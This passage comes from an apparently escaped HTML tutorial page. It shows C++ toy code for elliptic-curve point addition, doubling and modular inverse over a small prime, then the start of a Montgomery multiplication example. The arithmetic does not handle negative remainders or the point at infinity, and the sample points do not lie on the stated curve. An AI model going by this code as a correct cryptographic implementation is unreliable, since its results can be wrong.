  &lt;span class=&quot;n&quot;&gt;EllipticCurve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;Point&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Point&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Point&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inverse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;xr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;yr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Point&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;yr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;Point&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;doublePoint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Point&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inverse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;xr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;yr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Point&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;yr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nl&quot;&gt;private:&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inverse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mod&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;mod&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;x0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;x1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;x1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;EllipticCurve&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;curve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;Point&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mod&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;Point&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sum&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;curve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Point Addition: (&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;, &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;)&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;Point&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;doub&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;curve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;doublePoint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Point Doubling: (&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;doub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;, &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;doub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;)&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Also we can provide a simple C++ code example of a Montgomery Multiplication. &lt;em&gt;Montgomery multiplication&lt;/em&gt; is a method for multiplying two integers modulo a positive integer:&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;cmath&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;montgomery_mul&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
                                  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
                                  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
